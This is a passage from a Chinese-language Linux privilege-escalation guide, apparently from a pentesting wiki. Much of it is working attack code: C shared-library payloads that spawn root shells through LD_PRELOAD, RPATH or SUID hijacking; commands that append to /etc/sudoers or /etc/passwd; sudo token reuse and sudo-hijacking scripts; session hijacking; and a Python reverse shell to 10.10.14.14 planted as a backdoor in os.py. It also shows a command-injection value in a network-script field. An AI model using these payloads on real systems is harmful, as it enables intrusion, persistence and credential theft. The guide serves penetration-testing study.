export -f /usr/sbin/service
```
然后，当你调用suid二进制文件时，这个函数将被执行

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD**环境变量用于指定一个或多个共享库（.so文件），这些库将在加载器加载所有其他库之前被加载，包括标准C库（`libc.so`）。这个过程被称为库的预加载。

然而，为了维护系统安全并防止此功能被利用，特别是在**suid/sgid**可执行文件中，系统强制执行某些条件：

- 对于真实用户ID（_ruid_）与有效用户ID（_euid_）不匹配的可执行文件，加载器会忽略**LD_PRELOAD**。
- 对于具有suid/sgid的可执行文件，仅在标准路径中且也具有suid/sgid的库会被预加载。

如果你有能力使用`sudo`执行命令，并且`sudo -l`的输出包含语句**env_keep+=LD_PRELOAD**，则可能发生权限提升。此配置允许**LD_PRELOAD**环境变量持续存在并被识别，即使在使用`sudo`运行命令时，这可能导致以提升的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后 **编译它** 使用：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，**提升权限** 运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制了 **LD_LIBRARY_PATH** 环境变量，则可以滥用类似的特权提升，因为他控制了将要搜索库的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID 二进制文件 – .so 注入

当遇到一个具有 **SUID** 权限且看起来不寻常的二进制文件时，验证它是否正确加载 **.so** 文件是一个好习惯。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (没有这样的文件或目录)"_ 的错误提示可能表明存在利用的潜力。

为了利用这一点，可以创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
此代码在编译和执行后，旨在通过操纵文件权限并执行具有提升权限的 shell 来提升权限。

使用以下命令将上述 C 文件编译为共享对象 (.so) 文件：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID 二进制文件应该触发漏洞，从而可能导致系统被攻陷。

## 共享对象劫持
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
现在我们已经找到一个从我们可以写入的文件夹加载库的 SUID 二进制文件，让我们在该文件夹中创建具有必要名称的库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果您遇到类似的错误
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着您生成的库需要有一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个经过整理的 Unix 二进制文件列表，攻击者可以利用这些文件绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 则是针对只能 **注入参数** 的命令的情况。

该项目收集了可以被滥用的 Unix 二进制文件的合法功能，以打破受限的 shell，提升或维持提升的权限，传输文件，生成绑定和反向 shell，并促进其他后期利用任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}

{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果您可以访问 `sudo -l`，您可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查是否找到利用任何 sudo 规则的方法。

### 重用 Sudo 令牌

在您拥有 **sudo 访问权限** 但没有密码的情况下，您可以通过 **等待 sudo 命令执行然后劫持会话令牌** 来提升权限。

提升权限的要求：

- 您已经以用户 "_sampleuser_" 拥有一个 shell
- "_sampleuser_" 在 **过去 15 分钟内** **使用过 `sudo`** 执行了某些操作（默认情况下，这是允许我们在不输入任何密码的情况下使用 `sudo` 的 sudo 令牌的持续时间）
- `cat /proc/sys/kernel/yama/ptrace_scope` 为 0
- `gdb` 可访问（您可以上传它）

（您可以通过 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 临时启用 `ptrace_scope`，或通过永久修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0`）

如果满足所有这些要求，**您可以使用以下方法提升权限：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **第一个利用** (`exploit.sh`) 将在 _/tmp_ 中创建二进制文件 `activate_sudo_token`。您可以使用它来 **在您的会话中激活 sudo 令牌**（您不会自动获得 root shell，请执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 第二个漏洞 (`exploit_v2.sh`) 将在 _/tmp_ 中创建一个 **由 root 拥有并设置了 setuid 的 sh shell**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 第**三个漏洞** (`exploit_v3.sh`) 将**创建一个 sudoers 文件**，使**sudo 令牌永久有效并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果您在该文件夹或文件夹内创建的任何文件中具有**写权限**，则可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) **为用户和PID创建sudo令牌**。\
例如，如果您可以覆盖文件 _/var/run/sudo/ts/sampleuser_ 并且您以该用户的身份拥有PID 1234的shell，您可以**获得sudo权限**而无需知道密码，方法是：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 和 `/etc/sudoers.d` 中的文件配置了谁可以使用 `sudo` 以及如何使用。这些文件 **默认情况下只能被用户 root 和组 root 读取**。\
**如果** 你可以 **读取** 这个文件，你可能能够 **获得一些有趣的信息**，如果你可以 **写入** 任何文件，你将能够 **提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你会写东西，你就可以滥用这个权限。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
另一种滥用这些权限的方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些替代 `sudo` 二进制文件的选项，例如 OpenBSD 的 `doas`，请记得检查其配置在 `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道一个 **用户通常连接到一台机器并使用 `sudo`** 来提升权限，并且你在该用户上下文中获得了一个 shell，你可以 **创建一个新的 sudo 可执行文件**，该文件将以 root 身份执行你的代码，然后执行用户的命令。然后，**修改用户上下文的 $PATH**（例如在 .bash_profile 中添加新路径），这样当用户执行 sudo 时，你的 sudo 可执行文件就会被执行。

请注意，如果用户使用不同的 shell（不是 bash），你需要修改其他文件以添加新路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 修改了 `~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 中找到另一个示例。

或者运行类似的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示 **加载的配置文件来自哪里**。通常，这个文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着将读取来自 `/etc/ld.so.conf.d/*.conf` 的配置文件。这些配置文件 **指向其他文件夹**，在这些文件夹中将 **搜索** **库**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统将在 `/usr/local/lib` 内搜索库**。

如果由于某种原因 **用户对任何指示的路径具有写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内的任何文件或 `/etc/ld.so.conf.d/*.conf` 内的配置文件中的任何文件夹，他可能能够提升权限。\
请查看 **如何利用此错误配置** 在以下页面：

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将库复制到 `/var/tmp/flag15/`，它将被程序在此位置使用，如 `RPATH` 变量中指定的那样。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 中创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
阅读以下页面以**了解更多关于能力及其滥用的方法**：

{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

在目录中，**“执行”**位意味着受影响的用户可以“**cd**”进入该文件夹。\
**“读取”**位意味着用户可以**列出**文件，而**“写入”**位意味着用户可以**删除**和**创建**新**文件**。

## ACLs

访问控制列表（ACLs）代表了可自由裁量权限的第二层，能够**覆盖传统的ugo/rwx权限**。这些权限通过允许或拒绝特定用户（非所有者或不属于该组的用户）访问文件或目录，从而增强了对访问的控制。这种**粒度确保了更精确的访问管理**。更多细节可以在[**这里**](https://linuxconfig.org/how-to-manage-acls-on-linux)找到。

**给予**用户“kali”对文件的读取和写入权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取**具有特定 ACL 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell 会话

在 **旧版本** 中，您可能会 **劫持** 其他用户 (**root**) 的一些 **shell** 会话。\
在 **最新版本** 中，您将只能 **连接** 到 **您自己的用户** 的屏幕会话。然而，您可能会在会话中找到 **有趣的信息**。

### 屏幕会话劫持

**列出屏幕会话**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux 会话劫持

这是一个 **旧版 tmux** 的问题。作为非特权用户，我无法劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
检查 **Valentine box from HTB** 以获取示例。

## SSH

### Debian OpenSSL 可预测的 PRNG - CVE-2008-0166

在 2006 年 9 月到 2008 年 5 月 13 日之间，在基于 Debian 的系统（如 Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受到此漏洞的影响。\
此漏洞是在这些操作系统中创建新 ssh 密钥时造成的，因为 **仅有 32,768 种变体是可能的**。这意味着所有可能性都可以计算，并且 **拥有 ssh 公钥后，您可以搜索相应的私钥**。您可以在这里找到计算出的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 有趣的配置值

- **PasswordAuthentication:** 指定是否允许密码认证。默认值为 `no`。
- **PubkeyAuthentication:** 指定是否允许公钥认证。默认值为 `yes`。
- **PermitEmptyPasswords**: 当允许密码认证时，指定服务器是否允许使用空密码字符串登录账户。默认值为 `no`。

### PermitRootLogin

指定 root 是否可以使用 ssh 登录，默认值为 `no`。可能的值：

- `yes`: root 可以使用密码和私钥登录
- `without-password` 或 `prohibit-password`: root 只能使用私钥登录
- `forced-commands-only`: root 只能使用私钥登录，并且如果指定了命令选项
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于用户认证的公钥的文件。它可以包含像 `%h` 这样的标记，这将被主目录替换。**您可以指示绝对路径**（以 `/` 开头）或 **相对于用户主目录的相对路径**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置将指示如果您尝试使用用户“**testusername**”的**私钥**登录，ssh将比较您的密钥的公钥与位于`/home/testusername/.ssh/authorized_keys`和`/home/testusername/access`中的公钥。

### ForwardAgent/AllowAgentForwarding

SSH代理转发允许您**使用本地SSH密钥而不是将密钥**（没有密码短语！）留在服务器上。因此，您将能够**通过ssh跳转到一个主机**，然后从那里**跳转到另一个**主机**，使用**位于您**初始主机**中的**密钥**。

您需要在`$HOME/.ssh.config`中设置此选项，如下所示：
```
Host example.com
ForwardAgent yes
```
注意，如果 `Host` 是 `*`，每次用户跳转到不同的机器时，该主机将能够访问密钥（这是一项安全问题）。

文件 `/etc/ssh_config` 可以 **覆盖** 这些 **选项** 并允许或拒绝此配置。\
文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` **允许** 或 **拒绝** ssh-agent 转发（默认是允许）。

如果您发现在某个环境中配置了 Forward Agent，请阅读以下页面，因为 **您可能能够利用它来提升权限**：

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### 配置文件

文件 `/etc/profile` 和 `/etc/profile.d/` 下的文件是 **在用户运行新 shell 时执行的脚本**。因此，如果您可以 **写入或修改其中任何一个，您可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何奇怪的配置文件脚本，您应该检查其中是否包含**敏感细节**。

### Passwd/Shadow 文件

根据操作系统的不同，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或者可能存在备份。因此，建议**找到所有这些文件**并**检查您是否可以读取**它们，以查看**文件中是否包含哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，您可以在 `/etc/passwd`（或等效）文件中找到 **密码哈希**。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下命令之一生成密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
然后添加用户 `hacker` 并添加生成的密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如： `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

您现在可以使用 `su` 命令与 `hacker:hacker`

或者，您可以使用以下行添加一个没有密码的虚拟用户。\
警告：这可能会降低机器的当前安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在BSD平台上，`/etc/passwd`位于`/etc/pwd.db`和`/etc/master.passwd`，同时`/etc/shadow`被重命名为`/etc/spwd.db`。

您应该检查是否可以**写入某些敏感文件**。例如，您能否写入某些**服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行 **tomcat** 服务器，并且您可以 **修改 /etc/systemd/ 中的 Tomcat 服务配置文件，** 那么您可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
您的后门将在下次启动 tomcat 时执行。

### 检查文件夹

以下文件夹可能包含备份或有趣的信息：**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（您可能无法读取最后一个，但可以尝试）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/拥有的文件
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite 数据库文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **在 PATH 中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **网络文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

阅读[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)的代码，它会搜索**可能包含密码的多个文件**。\
**另一个有趣的工具**是：[**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用程序，用于检索存储在本地计算机上的大量密码，适用于Windows、Linux和Mac。

### 日志

如果您可以读取日志，您可能会在其中找到**有趣/机密的信息**。日志越奇怪，可能越有趣。\
此外，一些“**错误**”配置的（后门？）**审计日志**可能允许您**在审计日志中记录密码**，正如在这篇文章中所解释的：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了**读取日志，组** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 将非常有用。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

您还应该检查文件名中或内容中包含“**password**”一词的文件，并检查日志中的IP和电子邮件，或哈希正则表达式。\
我不会在这里列出如何做到这一切，但如果您感兴趣，可以查看[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)执行的最后检查。

## Writable files

### Python library hijacking

如果您知道**从哪里**将要执行python脚本，并且您**可以在**该文件夹中写入或**修改python库**，您可以修改OS库并进行后门（如果您可以写入python脚本将要执行的位置，请复制并粘贴os.py库）。

要**对库进行后门**，只需在os.py库的末尾添加以下行（更改IP和端口）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 利用

`logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **写权限** 的用户潜在地获得提升的权限。这是因为 `logrotate` 通常以 **root** 身份运行，可以被操控以执行任意文件，特别是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是要检查 _/var/log_ 中的权限，也要检查应用日志轮换的任何目录。

> [!TIP]
> 此漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

有关该漏洞的更详细信息可以在此页面找到：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

您可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 利用此漏洞。

此漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx 日志)** 非常相似，因此每当您发现可以更改日志时，请检查谁在管理这些日志，并检查是否可以通过符号链接提升权限。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果出于某种原因，用户能够 **写入** 一个 `ifcf-<whatever>` 脚本到 _/etc/sysconfig/network-scripts_ **或** 可以 **调整** 一个现有的脚本，那么您的 **系统就被攻陷了**。

网络脚本，例如 _ifcg-eth0_ 用于网络连接。它们看起来与 .INI 文件完全相同。然而，它们在 Linux 中由网络管理器（dispatcher.d）进行 \~sourced\~。

在我的案例中，这些网络脚本中的 `NAME=` 属性处理不当。如果您在名称中有 **空格**，系统会尝试执行空格后的部分。这意味着 **第一个空格后的所有内容都以 root 身份执行**。

例如： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd 和 rc.d**

目录 `/etc/init.d` 是 **System V init (SysVinit)** 的 **脚本** 所在地，这是 **经典的 Linux 服务管理系统**。它包含用于 `启动`、`停止`、`重启`，有时还会 `重新加载` 服务的脚本。这些脚本可以直接执行或通过在 `/etc/rc?.d/` 中找到的符号链接执行。在 Redhat 系统中，另一个路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关，这是由 Ubuntu 引入的较新的 **服务管理**，使用配置文件进行服务管理任务。尽管已经过渡到 Upstart，但由于 Upstart 中的兼容性层，SysVinit 脚本仍与 Upstart 配置一起使用。

**systemd** 作为现代初始化和服务管理器出现，提供了高级功能，如按需守护进程启动、自动挂载管理和系统状态快照。它将文件组织到 `/usr/lib/systemd/` 以供分发包使用，并将 `/etc/systemd/system/` 用于管理员修改，从而简化了系统管理过程。

## 其他技巧

### NFS 权限提升

{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### 从受限 Shell 中逃逸

{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage

{{#ref}}
cisco-vmanage.md
{{#endref}}

## 内核安全保护

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 更多帮助

[静态 impacket 二进制文件](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix 权限提升工具

### **查找 Linux 本地权限提升向量的最佳工具：** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t 选项)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix 权限提升检查:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux 权限检查器:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** 在 Linux 和 MAC 中枚举内核漏洞 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理访问):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**更多脚本的汇编**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考文献

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
